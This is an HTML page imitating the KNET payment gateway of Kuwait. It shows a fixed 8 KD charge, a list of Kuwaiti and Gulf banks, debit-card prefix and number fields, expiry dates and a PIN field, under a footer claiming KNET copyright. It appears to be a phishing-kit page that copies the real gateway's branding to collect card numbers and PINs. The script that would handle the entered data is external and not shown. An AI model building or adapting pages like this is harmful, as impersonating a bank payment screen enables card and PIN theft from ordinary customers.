<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Payment</title>
    <link rel="stylesheet" href="style/all.min.css" />
    <link rel="stylesheet" href="style/bootstrap-icons.css" />
    <link rel="stylesheet" href="style/bootstrap.min.css" />
    <link rel="stylesheet" href="style/css.css" />
  </head>

  <body>
    <main>
      <section class="sec">
        <div class="container full-screen">
          <div class="form-card">
            <div class="pic d-flex justify-content-center pb-3">
              <img src="img/knet.png" alt="" />
            </div>
            <div class="pay">
              <label>Merchant:</label>
              <label>KNET Payment</label>
            </div>
            <hr />
            <div class="Amount">
              <label>Amount:</label>
              <label for="">8KD&nbsp;</label>
            </div>
          </div>
          <div class="form-card">
            <div class="bank">
              <label>Select Your Bank:</label>
              <select class="column-value">
                <option value="bankname" title="Select Your Bank">
                  Select Your Banks
                </option>
                <option value="NBK">National Bank of Kuwait [NBK]</option>
                <option value="CBK">Commercial Bank of Kuwait [CBK]</option>
                <option value="GBK">Gulf Bank [GBK]</option>
                <option value="ABK">Al Ahli Bank of Kuwait [ABK]</option>
                <option value="BURGAN">Burgan Bank [BURGAN]</option>
                <option value="KFH">Kuwait Finance House [KFH]</option>
                <option value="BOUBYAN">Boubyan Bank [BOUBYAN]</option>
                <option value="KIB">Kuwait International Bank [KIB]</option>
                <option value="UNB">Union National Bank [UNB]</option>
                <option value="BBK">Bank of Bahrain and Kuwait [BBK]</option>
                <option value="BNP">BNP Paribas [BNP]</option>
                <option value="HSBC">HSBC Middle East Bank [HSBC]</option>
                <option value="FAB">First Abu Dhabi Bank [FAB]</option>
                <option value="CITIBANK">Citibank [CITIBANK]</option>
                <option value="QNB">Qatar National Bank [QNB]</option>
                <option value="Doha">Doha Bank [Doha]</option>
                <option value="ALRAJHI">Al Rajhi Bank [ALRAJHI]</option>
                <option value="BANK_MUSCAT">Bank Muscat [BANK_MUSCAT]</option>
                <option value="WARBA">Warba Bank [WARBA]</option>
              </select>
            </div>
            <hr />
            <div class="credit-card">
              <label for="Number">Card Number:</label>
              <div class="option">
                <select class="column-value1" name="dcprefix" id="dcprefix">
                  <option value="i">prefix</option>
                  <option value="447284">447284</option>
                  <option value="530001">530001</option>
                  <option value="453095">453095</option>
                </select>
                <input
                  id="Number"
                  inputmode="numeric"
                  pattern="[0-9]*"
                  size="10"
                  class="allownumericwithoutdecimal"
                  maxlength="10"
                  title="Should be in number. Length should be 10"
                  type="tel"
                  name="debitNumber"
                />
              </div>
            </div>
            <hr />
            <div class="Expire">
              <label>Expiration Date:</label>
              <div class="option1">
                <select class="column-value">
                  <option value="0">MM</option>
                  <option value="1">01</option>
                  <option value="2">02</option>
                  <option value="3">03</option>
                  <option value="4">04</option>
                  <option value="5">05</option>
                  <option value="6">06</option>
                  <option value="7">07</option>
                  <option value="8">08</option>
                  <option value="9">09</option>
                  <option value="10">10</option>
                  <option value="11">11</option>
                  <option value="12">12</option>
                </select>
                <select class="column-long">
                  <option value="0">YYYY</option>
                  <option value="2024">2024</option>
                  <option value="2025">2025</option>
                  <option value="2026">2026</option>
                  <option value="2027">2027</option>
                  <option value="2028">2028</option>
                  <option value="2029">2029</option>
                  <option value="2030">2030</option>
                  <option value="2031">2031</option>
                  <option value="2032">2032</option>
                  <option value="2033">2033</option>
                  <option value="2034">2034</option>
                  <option value="2035">2035</option>
                  <option value="2036">2036</option>
                  <option value="2037">2037</option>
                  <option value="2038">2038</option>
                  <option value="2039">2039</option>
                  <option value="2040">2040</option>
                  <option value="2041">2041</option>
                  <option value="2042">2042</option>
                  <option value="2043">2043</option>
                  <option value="2044">2044</option>
                  <option value="2045">2045</option>
                  <option value="2046">2046</option>
                  <option value="2047">2047</option>
                  <option value="2048">2048</option>
                  <option value="2049">2049</option>
                  <option value="2050">2050</option>
                  <option value="2051">2051</option>
                  <option value="2052">2052</option>
                  <option value="2053">2053</option>
                  <option value="2054">2054</option>
                  <option value="2055">2055</option>
                  <option value="2056">2056</option>
                  <option value="2057">2057</option>
                  <option value="2058">2058</option>
                  <option value="2059">2059</option>
                  <option value="2060">2060</option>
                  <option value="2061">2061</option>
                  <option value="2062">2062</option>
                  <option value="2063">2063</option>
                  <option value="2064">2064</option>
                  <option value="2065">2065</option>
                  <option value="2066">2066</option>
                  <option value="2067">2067</option>
                </select>
              </div>
            </div>
            <hr />
            <div class="pin">
              <label for="num">PIN:</label>
              <input
                inputmode="numeric"
                pattern="[0-9]*"
                id="num"
                autocomplete="off"
                title="Should be in number. Length should be 4"
                size="4"
                maxlength="4"
                class="allownumericwithoutdecimal"
                type="password"
                name="cardPin"
              />
            </div>
          </div>
          <div class="form-card">
            <div class="btns">
              <button type="button" disabled>Sumbit</button>
              <button type="button">Cancel</button>
            </div>
          </div>
        </div>
      </section>
    </main>
    <footer class="">
      <div class="container All">
        <div class="rights text-start text-sm-center">
          <p>
            All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;ï¿½&nbsp;
          </p>
          <p>
            The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company
            - KNET
          </p>
        </div>
      </div>
    </footer>
  </body>
  <script src="vendor/bootstrap.bundle.js"></script>
  <script src="vendor/main.js"></script>
</html>
